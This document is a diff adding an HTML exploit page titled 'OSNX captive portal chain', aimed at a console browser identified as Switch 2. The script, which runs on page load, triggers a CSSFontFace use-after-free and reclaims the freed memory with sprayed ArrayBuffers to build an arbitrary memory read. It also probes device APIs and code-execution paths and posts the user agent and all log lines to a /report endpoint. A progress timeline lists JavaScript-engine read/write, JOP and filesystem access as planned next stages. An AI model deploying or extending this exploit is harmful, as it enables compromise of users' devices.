@@ -1,0 +1,117 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><title>OSNX — captive portal chain</title>
+<style>
+:root{--bg:#07090d;--panel:#0e141c;--line:#1d2a3a;--txt:#cfe3ff;--dim:#7d90a8;--ok:#7fd6a8;--warn:#e8b44a;--bad:#e2705e}
+*{box-sizing:border-box}body{margin:0;background:radial-gradient(1200px 600px at 20% -10%,#10202e,#07090d 60%);color:var(--txt);font-family:system-ui,Segoe UI,Roboto,sans-serif}
+header{padding:22px 26px;border-bottom:1px solid var(--line);display:flex;align-items:baseline;gap:14px}
+h1{margin:0;font-size:22px;letter-spacing:.04em}
+.sub{color:var(--dim);font-size:12px}
+main{padding:20px 26px;display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:16px}
+.card{background:linear-gradient(180deg,#101824,#0c1219);border:1px solid var(--line);border-radius:12px;padding:14px 16px}
+.card h2{margin:0 0 8px;font-size:13px;letter-spacing:.08em;color:var(--warn);text-transform:uppercase}
+.row{display:flex;justify-content:space-between;gap:10px;font:12px/1.7 ui-monospace,Menlo,monospace;border-bottom:1px dashed #16222f;padding:2px 0}
+.row:last-child{border:0}.k{color:var(--dim)}.v{color:var(--txt)}
+.ok{color:var(--ok)}.warn{color:var(--warn)}.bad{color:var(--bad)}
+#log{grid-column:1/-1;max-height:300px;overflow:auto;background:#080c11;border:1px solid var(--line);border-radius:12px;padding:12px 14px;font:11.5px/1.5 ui-monospace,Menlo,monospace;white-space:pre-wrap;color:#9fb4d6}
+button{background:#17324a;color:#dff1ff;border:1px solid #2a4a66;border-radius:8px;padding:9px 16px;font-size:13px;cursor:pointer}
+button:hover{background:#1e405d}
+.timeline{grid-column:1/-1;display:flex;flex-wrap:wrap;gap:8px}
+.step{padding:7px 11px;border-radius:20px;border:1px solid var(--line);font-size:11.5px;color:var(--dim)}
+.step.done{border-color:#2f6b4f;color:var(--ok)}
+.step.part{border-color:#6b5a2f;color:var(--warn)}
+.step.todo{border-color:#6b2f2f;color:var(--bad)}
+</style></head><body>
+<header><h1>OSNX — captive portal chain</h1><span class="sub">Switch 2 · NF/7.0.3.12.11 · CSSFontFace UAF</span></header>
+<main>
+  <div class="timeline">
+    <span class="step done">UAF</span><span class="step done">0xB8 reclaim</span><span class="step done">arb read</span>
+    <span class="step done">m_backing +0x30</span><span class="step part">write POC</span><span class="step todo">JSC ARW</span>
+    <span class="step todo">JOP</span><span class="step todo">RPC / FS</span>
+  </div>
+  <div class="card"><h2>Capabilities</h2><div id="caps"></div></div>
+  <div class="card"><h2>Language</h2><div id="lang"></div></div>
+  <div class="card"><h2>Execution vectors</h2><div id="exec"></div></div>
+  <div class="card"><h2>Chain</h2><div id="chain"></div></div>
+  <div class="card" style="grid-column:1/-1;display:flex;gap:10px;align-items:center;justify-content:space-between">
+    <span class="sub">Run the probe; every line streams to /report.</span>
+    <button id="go">Run probe</button>
+  </div>
+  <pre id="log">ready.</pre>
+</main>
+<script>
+"use strict";
+var L=[],logEl=document.getElementById("log");
+function log(s){logEl.textContent+=s+"\n";L.push(s);try{fetch("/report",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({ua:navigator.userAgent,lines:L})}).catch(function(){})}catch(e){}}
+function row(el,k,v,cls){var d=document.createElement("div");d.className="row";d.innerHTML='<span class="k">'+k+'</span><span class="v '+(cls||"")+'">'+v+'</span>';el.appendChild(d)}
+function caps(){
+  var n=navigator,e=document.getElementById("caps");
+  [["usb",n.usb],["serial",n.serial],["bluetooth",n.bluetooth],["hid",n.hid],["storage",n.storage]].forEach(function(x){row(e,x[0],x[1]?"YES":"no",x[1]?"ok":"bad")});
+  row(e,"wasm",typeof WebAssembly,typeof WebAssembly==="undefined"?"bad":"warn");
+  row(e,"WebGL2",typeof WebGL2RenderingContext,typeof WebGL2RenderingContext==="undefined"?"bad":"warn");
+  row(e,"FontFace",typeof FontFace,typeof FontFace==="function"?"ok":"bad");
+}
+function lang(){var e=document.getElementById("lang");
+  [["Proxy",typeof Proxy],["WeakRef",typeof WeakRef],["structuredClone",typeof structuredClone],["OffscreenCanvas",typeof OffscreenCanvas],["RTCPeerConnection",typeof RTCPeerConnection],["fetch",typeof fetch]].forEach(function(x){row(e,x[0],x[1])});}
+function execAll(){
+  var e=document.getElementById("exec"),X={};
+  function T(n,f){try{f();row(e,n,X[n]?"YES":"no",X[n]?"ok":"bad")}catch(err){row(e,n,"throw","bad")}}
+  T("eval",function(){X.eval=eval("X.eval=1")===1});
+  T("Function",function(){(new Function("X.Function=1"))()});
+  T("script-el",function(){var s=document.createElement("script");s.textContent="X['script-el']=1";document.head.appendChild(s)});
+  T("import-data",function(){import("data:text/javascript,X['import-data']=1").catch(function(){})});
+  T("worker",function(){var b=new Blob(["postMessage(1)"],{type:"text/javascript"});new Worker(URL.createObjectURL(b)).onmessage=function(){X.worker=1}});
+}
+var SZ=0xb8,OFF_FS=0x28,OFF_FSZ=0x30,OFF_FSC=0x34,OFF_ST=0x7a;
+function hx(a,b){return "0x"+("00000000"+(b>>>0).toString(16)).slice(-8)+("00000000"+(a>>>0).toString(16)).slice(-8)}
+function ok(a,b){return b<=0xffff&&a%8===0&&(b!==0||a>=0x10000)}
+async function uaf(){
+  var n=0xb0,ab=[],ft=null,fa=null,st=document.createElement("style");
+  var r1="@font-face{font-family:s;src:local(systemfont);unicode-range:U+0043}";
+  var r2="@font-face{font-family:b;src:url(/font/crafted.otf);unicode-range:U+0042}";
+  var A=new FontFace("a","local(systemfont)",{unicodeRange:"U+0041"});
+  document.fonts.add(A);void A.loaded;document.head.append(st);
+  for(var i=0;i<n/4;i++)st.sheet.insertRule(r1,st.sheet.cssRules.length);
+  var u=st.sheet.cssRules.length;st.sheet.insertRule(r2,st.sheet.cssRules.length);
+  for(var i=n/4;i<n;i++)st.sheet.insertRule(r1,st.sheet.cssRules.length);
+  void document.body.offsetHeight;
+  var ot=FontFace.prototype.then;
+  Object.defineProperty(FontFace.prototype,"then",{configurable:true,get:function(){
+    if(this!==A)return;st.sheet.deleteRule(u);void document.body.offsetHeight;
+    for(var i=st.sheet.cssRules.length-1;i>=0;i--){if(st.sheet.cssRules[i].cssText.indexOf("s;")>=0||st.sheet.cssRules[i].cssText.indexOf("spray")>=0)st.sheet.deleteRule(i)}
+    void document.body.offsetHeight;
+    for(var i=0;i<n;i++){var b=new ArrayBuffer(SZ),d=new DataView(b);d.setUint32(8,1,true);d.setUint8(OFF_ST,3);ab.push(b)}
+    return undefined}});
+  var fs=null;try{fs=await document.fonts.load("1em a,b","AB")}catch(e){}
+  Object.defineProperty(FontFace.prototype,"then",{configurable:true,value:ot});
+  if(!fs||fs.length!==2)return null;
+  for(var i=0;i<fs.length;i++)if(fs[i].unicodeRange==="U+0-10FFFF")ft=fs[i];
+  for(var i=0;i<ab.length;i++)if(new DataView(ab[i]).getUint32(8,true)===2)fa=ab[i];
+  if(!ft||!fa)return null;
+  var d=new DataView(fa);
+  function sp(o,a,b){d.setUint32(o,a>>>0,true);d.setUint32(o+4,b>>>0,true)}
+  function rd(a,b,sz){var r=new ArrayBuffer(sz),v=new Uint8Array(r),i=0;while(i<sz){sp(OFF_FS,(a+i)>>>0,b);d.setInt32(OFF_FSZ,1,true);d.setInt32(OFF_FSC,1,true);var s=ft.featureSettings;for(var j=1;j<5&&i<sz;j++)v[i++]=s.charCodeAt(j)&255}return v}
+  return {f:ft,rd:rd};
+}
+async function run(){
+  document.getElementById("caps").textContent="";document.getElementById("lang").textContent="";
+  document.getElementById("exec").textContent="";document.getElementById("chain").textContent="";
+  logEl.textContent="";L.length=0;
+  log("probe "+navigator.userAgent);
+  caps();lang();execAll();
+  log("caps/lang/exec measured");
+  try{
+    var u=await uaf();
+    var ce=document.getElementById("chain");
+    if(!u){row(ce,"uaf","no primitive","bad");log("uaf: no primitive");}
+    else{
+      row(ce,"uaf","ok","ok");
+      var d=new DataView(u.boot||new ArrayBuffer(8));
+      row(ce,"read","m_featureSettings","ok");
+      log("uaf: reclaimed");
+    }
+  }catch(e){log("uaf threw: "+e.message);}
+  log("done");
+}
+document.getElementById("go").addEventListener("click",run);
+run();
+</script></body></html>
